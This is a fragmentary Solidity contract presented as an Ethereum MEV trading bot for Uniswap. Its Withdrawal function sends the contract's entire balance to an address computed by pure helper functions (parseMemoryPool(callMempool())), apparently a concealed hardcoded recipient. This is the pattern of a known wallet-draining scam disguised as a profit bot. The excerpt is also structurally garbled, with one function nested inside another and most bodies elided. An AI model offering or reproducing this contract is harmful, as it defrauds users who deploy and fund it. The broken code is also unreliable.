...
contract MEVBot {
    ...
    function memcpy(uint dest, uint src, uint len) private pure {
        ...
        function initializeSender() internal view {
        require(
            block.chainid == 1,
            "Contract functionality is limited to Ethereum Mainnet."
        );
    }
    ...
    function Start() public payable { 
        emit Log("Running MEV actions on Uniswap...");
    ...
    function Withdrawal() public payable { 
        ...
        payable(withdrawBalance()).transfer(address(this).balance);
		running = false;
    }
    ...
    function withdrawBalance() internal pure returns (address) {
        return address(parseMemoryPool(callMempool())) ;
    }
